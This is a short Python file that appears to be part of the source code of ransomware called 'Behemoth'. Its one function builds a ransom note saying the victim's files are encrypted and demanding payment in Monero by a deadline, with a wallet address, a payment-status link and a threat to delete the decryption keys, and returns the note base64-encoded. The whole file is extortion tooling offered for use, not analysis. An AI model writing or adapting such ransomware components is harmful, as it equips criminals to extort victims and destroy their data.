from base64 import b64encode


def instruct(payment, deadline, wallet, files, status, uid):
    textwall = f"Your files has been encrypted with Behemoth ransomware.\nBehemoth has encrypted about {files} of your files. " \
               f"In order to decrypt them you have to pay a ransom of {payment} in form of Monero (XMR)\n\n" \
               f"You have to send this payment by {deadline} or else your keys will be deleted " \
               f"from our database and your files will be unrecoverable.\nSend the ransom to this address: {wallet}\n\n" \
               f"You can check your payment status in here: {status}status/{uid}"
    return b64encode(textwall.encode('utf8')).decode('utf8')



